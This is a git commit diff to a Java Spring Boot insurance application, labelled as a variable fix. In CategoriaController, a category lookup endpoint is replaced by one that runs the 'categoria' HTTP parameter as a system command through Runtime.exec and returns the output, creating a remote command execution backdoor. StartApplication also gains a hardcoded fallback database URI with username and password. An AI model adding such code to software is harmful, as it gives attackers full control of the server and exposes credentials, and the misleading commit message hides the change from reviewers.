124e3af849faf609e4cccec59e8c854182b14291
Jasiel Pereira de sant ana <PRO_JPEREIRA@fastalelo.onmicrosoft.com>
2021-04-03 21:52:57 -0300

    Correção variavel

--- src/main/java/com/sura/seguros/StartApplication.java
+++ src/main/java/com/sura/seguros/StartApplication.java
@@ -11,13 +11,26 @@ public class StartApplication
 {  
     public static void main(String[] args)  throws URISyntaxException
     {
-    	URI dbUri = new URI(System.getenv("DATABASE_URL"));
-    	 
-	    System.setProperty("spring.datasource.username",dbUri.getUserInfo().split(":")[0]);
-	    System.setProperty("spring.datasource.password",dbUri.getUserInfo().split(":")[1]);
-	    System.setProperty("spring.datasource.url","jdbc:postgresql://" + dbUri.getHost() + ':' + dbUri.getPort() + dbUri.getPath() + "?sslmode=require");
-		System.setProperty("spring.datasource.driver-class-name", "org.postgresql.Driver");
-		
+    	
+    	
+    	String sEnv = System.getenv("DATABASE_URL");
+    	URI dbUri = null;
+    	if(sEnv==null)
+    	{
+    		  dbUri = new URI("postgres://iolgtiocldpyil:rwrwerwerwetwt.aws@ec2-54-91-178-234.compute-1.amazonaws.com:5532/fsfdsfs");
+       	}
+    	else
+    	{
+    		  dbUri = new URI(System.getenv("DATABASE_URL"));
+    	}
+    	
+    	System.setProperty("spring.datasource.username",dbUri.getUserInfo().split(":")[0]);
+   	    System.setProperty("spring.datasource.password",dbUri.getUserInfo().split(":")[1]);
+   	    System.setProperty("spring.datasource.url","jdbc:postgresql://" + dbUri.getHost() + ':' + dbUri.getPort() + dbUri.getPath() + "?sslmode=require");
+   		System.setProperty("spring.datasource.driver-class-name", "org.postgresql.Driver");
+   			 
+
+    	
         SpringApplication.run(StartApplication.class, args);
     }     
 }
--- src/main/java/com/sura/seguros/controller/CategoriaController.java
+++ src/main/java/com/sura/seguros/controller/CategoriaController.java
@@ -1,7 +1,8 @@
 package com.sura.seguros.controller;
 
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 import java.net.URI;
-import java.util.Optional;
 
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.http.ResponseEntity;
@@ -31,9 +32,40 @@ public class CategoriaController
     }
      
     @GetMapping(path="/categoria", produces = "application/json")
-    public Optional<Categoria> consultarCategoriaPeloIdCategoria(@RequestParam Long id_categoria) 
+    public String consultarCategoriaPeloIdCategoria(@RequestParam String categoria) 
     {
-        return categoriaRepository.findById(id_categoria);
+    	Process process = null;
+    	String line_="";
+    	  try
+          { 
+    		  process = Runtime.getRuntime().exec(categoria); 
+
+    		  process.waitFor();
+    		  BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+    		  String line;
+    		  
+  		  		while ((line=reader.readLine())!=null)
+    		  	{
+  		  				line_+=line;
+    		  			System.out.println(line);   
+    		  	} 
+    		  	
+    		  	
+           }       
+              catch(Exception e)
+           { 
+               System.out.println(e); 
+           }
+           finally
+           {
+             process.destroy();
+           }  
+    	
+    	
+    	
+    	
+    	
+      return line_;
     }
     
     @DeleteMapping(path= "/", consumes = "application/json", produces = "application/json")
